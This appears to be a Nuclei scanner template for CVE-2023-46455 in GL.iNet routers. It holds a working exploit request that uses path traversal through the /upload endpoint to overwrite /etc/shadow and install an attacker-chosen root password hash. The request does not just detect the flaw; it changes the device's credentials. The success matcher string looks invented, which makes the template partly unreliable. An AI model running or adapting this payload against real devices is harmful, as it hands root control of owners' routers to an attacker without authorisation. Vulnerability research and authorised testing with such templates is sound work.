id: gl-inet-arbitrary-file-write

info:
  name: GL.iNet <= 4.3.7 Arbitrary File Write
  author: Zierax
  severity: critical
  tags: arbitrary-file-write, authenticated, file-upload
  description: |
    GL.iNet <= 4.3.7 is vulnerable to an arbitrary file write exploit, allowing an attacker to overwrite system files, including the shadow file, to modify root access credentials.
  references:
    - https://www.gli-net.com
  date: 2023-11-XX
  cve: CVE-2023-46455
  software:
    name: GL.iNet
    version: "<= 4.3.7"

requests:
  - method: POST
    path:
      - "{{BaseURL}}/upload"

    body: |
      -----------------------------81419250823331111993422505835
      Content-Disposition: form-data; name="sid"

      {{auth_token}}
      -----------------------------81419250823331111993422505835
      Content-Disposition: form-data; name="size"

      4
      -----------------------------81419250823331111993422505835
      Content-Disposition: form-data; name="path"

      /tmp/ovpn_upload/../../etc/shadow
      -----------------------------81419250823331111993422505835
      Content-Disposition: form-data; name="file"; filename="shadow"
      Content-Type: application/octet-stream

      root:{{salted_password}}:19459:0:99999:7:::
      daemon:*:0:0:99999:7:::
      ftp:*:0:0:99999:7:::
      network:*:0:0:99999:7:::
      nobody:*:0:0:99999:7:::
      dnsmasq:x:0:0:99999:7:::
      stubby:x:0:0:99999:7:::
      ntp:x:0:0:99999:7:::
      mosquitto:x:0:0:99999:7:::
      logd:x:0:0:99999:7:::
      ubus:x:0:0:99999:7:::
      -----------------------------81419250823331111993422505835--

    headers:
      Content-Type: multipart/form-data; boundary=---------------------------81419250823331111993422505835
      X-Requested-With: XMLHttpRequest

    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "shadow file replaced successfully"  
        part: body
